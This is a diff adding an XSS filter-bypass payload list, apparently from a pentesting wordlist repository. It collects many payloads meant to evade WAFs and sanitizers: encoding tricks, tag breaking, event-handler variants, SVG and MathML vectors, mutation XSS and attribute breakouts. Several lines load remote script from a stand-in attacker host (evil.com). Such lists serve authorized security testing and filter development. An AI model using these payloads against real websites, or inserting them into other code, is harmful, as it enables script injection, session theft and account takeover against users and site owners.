@@ -1,0 +1,285 @@
+# XSS - Filter Bypass Payloads
+# Techniques to evade WAF, filters, and sanitization
+# 400+ bypass techniques
+
+# Case variations
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<scRIPT>alert(1)</scRIPT>
+<ScRiPt>alert(document.domain)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+<iMg SrC=x OnErRoR=alert(1)>
+<ImG sRc=x oNeRrOr=alert(1)>
+<SVG ONLOAD=alert(1)>
+<sVg OnLoAd=alert(1)>
+
+# Null bytes
+<scr\x00ipt>alert(1)</script>
+<sc\x00ript>alert(1)</script>
+<scri\x00pt>alert(1)</script>
+<img src=x onerror=\x00alert(1)>
+<img src=x onerror=al\x00ert(1)>
+<script\x00>alert(1)</script>
+<scr%00ipt>alert(1)</script>
+
+# Newlines and tabs
+<script
+>alert(1)</script>
+<script>alert(1
+)</script>
+<img src=x
+onerror=alert(1)>
+<img src=x onerror
+=alert(1)>
+<img src=x onerror=
+alert(1)>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<script	>alert(1)</script>
+
+# HTML entities
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+<img src=x onerror=&#0097;&#0108;&#0101;&#0114;&#0116;(1)>
+<a href="j&#97;v&#97;script:alert(1)">Click</a>
+<a href="j&#x61;v&#x61;script:alert(1)">Click</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">Click</a>
+<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">Click</a>
+&#60;script&#62;alert(1)&#60;/script&#62;
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# HTML5 entities
+<img src=x onerror=&NewLine;alert(1)>
+<img src=x onerror=&Tab;alert(1)>
+<img src=x onerror=&colon;alert(1)>
+
+# URL encoding
+<img src=x onerror=%61%6c%65%72%74(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+%3Csvg%20onload=alert(1)%3E
+<a href="javascript%3Aalert(1)">Click</a>
+<a href="javascript%253Aalert(1)">Click</a>
+
+# Double URL encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Cimg%2520src=x%2520onerror=alert(1)%253E
+
+# Unicode encoding
+<script>alert\u0028\u0031\u0029</script>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>al\u0065rt(1)</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=al\u0065rt(1)>
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+
+# Octal encoding
+<script>alert(\61)</script>
+<script>\141\154\145\162\164(1)</script>
+
+# Hex encoding in JavaScript
+<script>alert('\x58\x53\x53')</script>
+<script>\x61\x6c\x65\x72\x74(1)</script>
+<img src=x onerror=\x61lert(1)>
+
+# Base64 data URIs
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# Breaking tag structure
+<scr<script>ipt>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>script>alert(1)</script>
+<script<script>>alert(1)</script>
+<scri<!--comment-->pt>alert(1)</script>
+
+# Event handler variations
+<img src=x onerror	=alert(1)>
+<img src=x onerror
+=alert(1)>
+<img src=x onerror=alert(1)
+>
+<img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(1) x>
+<img src=x onerror=alert(1) foo=bar>
+<img src=x onerror  =  alert(1)>
+
+# Quote variations
+<img src=x onerror=alert(1)>
+<img src=x onerror='alert(1)'>
+<img src=x onerror="alert(1)">
+<img src=x onerror=`alert(1)`>
+<img src='x' onerror='alert(1)'>
+<img src="x" onerror="alert(1)">
+<a href='javascript:alert(1)'>Click</a>
+<a href=`javascript:alert(1)`>Click</a>
+
+# Backticks (template literals)
+<script>alert`1`</script>
+<script>alert`XSS`</script>
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+
+# Forward slashes
+<img/src=x/onerror=alert(1)>
+<script/src=//evil.com/xss.js>
+<svg/onload=alert(1)/>
+<input/onfocus=alert(1)/autofocus>
+
+# Parentheses bypass
+<script>alert(1)</script>
+<script>alert`1`</script>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>onerror=alert;throw 1337</script>
+<script>window['alert'](1)</script>
+<script>window["alert"](1)</script>
+<script>this['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>Reflect.apply(alert,window,[1])</script>
+
+# Eval and Function constructor
+<script>eval('alert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>''.constructor.constructor('alert(1)')()</script>
+<script>({}).constructor.constructor('alert(1)')()</script>
+
+# SetTimeout/SetInterval
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+<script>setTimeout(alert,0,1)</script>
+<svg onload=setTimeout('alert(1)')>
+<img src=x onerror=setTimeout('alert(1)')>
+
+# With statement bypass
+<script>with(document)with(body)with(appendChild(createElement('script')))src='//evil.com'</script>
+
+# Location bypass
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+<script>window.location='javascript:alert(1)'</script>
+<script>document.location='javascript:alert(1)'</script>
+<script>top.location='javascript:alert(1)'</script>
+
+# innerHTML bypass
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>document.write('<script>alert(1)<\/script>')</script>
+
+# Prototype pollution XSS
+<script>Object.prototype.innerHTML='<img src=x onerror=alert(1)>'</script>
+
+# SVG specific bypasses
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&lpar;1&rpar;</script></svg>
+<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>
+<svg><script xlink:href=data:,alert(1)></script></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"></use></svg>
+<svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>
+
+# Math ML
+<math><maction actiontype="toggle"><ms>xss</ms><mtext onclick=alert(1)>CLICK</mtext></maction></math>
+
+# JavaScript protocol variations
+<a href="javascript:alert(1)">Click</a>
+<a href="javascript&#58;alert(1)">Click</a>
+<a href="javascript&#x3a;alert(1)">Click</a>
+<a href="javascript&#x003a;alert(1)">Click</a>
+<a href="java script:alert(1)">Click</a>
+<a href="java	script:alert(1)">Click</a>
+<a href="java
+script:alert(1)">Click</a>
+<a href="&#106;avascript:alert(1)">Click</a>
+<a href="&#x6a;avascript:alert(1)">Click</a>
+<a href="jav	ascript:alert(1)">Click</a>
+<a href="jav&#x09;ascript:alert(1)">Click</a>
+<a href="jav&#x0A;ascript:alert(1)">Click</a>
+<a href="jav&#x0D;ascript:alert(1)">Click</a>
+
+# VBScript (IE only, legacy)
+<a href="vbscript:MsgBox(1)">Click</a>
+
+# Expression (IE only, legacy)
+<div style="width:expression(alert(1))">
+
+# Data protocol variations
+<a href="data:text/html,<script>alert(1)</script>">Click</a>
+<a href="data:text/html;charset=utf-8,<script>alert(1)</script>">Click</a>
+<a href="DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>
+
+# Filter keyword bypass - split strings
+<script>al/**/ert(1)</script>
+<script>al\nert(1)</script>
+<script>a]lert(1)</script>
+<script>window['al'+'ert'](1)</script>
+<script>window['ale'+'rt'](1)</script>
+<script>eval('ale'+'rt(1)')</script>
+<script>eval('al'+String.fromCharCode(101)+'rt(1)')</script>
+
+# Using other alert methods
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>console.log(1)</script>
+<script>print(1)</script>
+
+# DOM clobbering
+<form id=alert><input id=alert name=call></form><script>document.getElementById("alert").call(1)</script>
+<img name=alert><img name=alert><script>alert(1)</script>
+
+# Mutation XSS (mXSS)
+<noscript><p title="</noscript><script>alert(1)</script>">
+<title><img src=x onerror=alert(1)></title>
+<style><img src=x onerror=alert(1)></style>
+
+# Iframe sandbox bypass
+<iframe sandbox="allow-scripts" src="data:text/html,<script>alert(1)</script>">
+
+# CDATA bypass (XML contexts)
+<![CDATA[<script>alert(1)</script>]]>
+<svg><![CDATA[<script>alert(1)</script>]]></svg>
+
+# Comment breakout
+--><script>alert(1)</script>
+--!><script>alert(1)</script>
+<!-- --><script>alert(1)</script>
+</comment><script>alert(1)</script>
+
+# Attribute breakout
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><svg/onload=alert(1)>
+' onclick=alert(1) x='
+" onclick=alert(1) x="
+' onmouseover=alert(1) x='
+" onmouseover=alert(1) x="
+
+# Style attribute XSS (old IE)
+<div style="background-image:url(javascript:alert(1))">
+<div style="behavior:url(xss.htc)">
+
+# Import XSS
+<script src="//evil.com/xss.js"></script>
+<link rel="import" href="//evil.com/xss.html">
+<script src="data:text/javascript,alert(1)"></script>
+
+# Module import
+<script type="module">import('//evil.com/xss.js')</script>
+
+# Service worker XSS
+<script>navigator.serviceWorker.register('evil.js')</script>
+
+# Very long payloads for WAF bypass
+<script>alert(1)/*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*/</script>
+<img src=x onerror=alert(1)/*BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB*/>
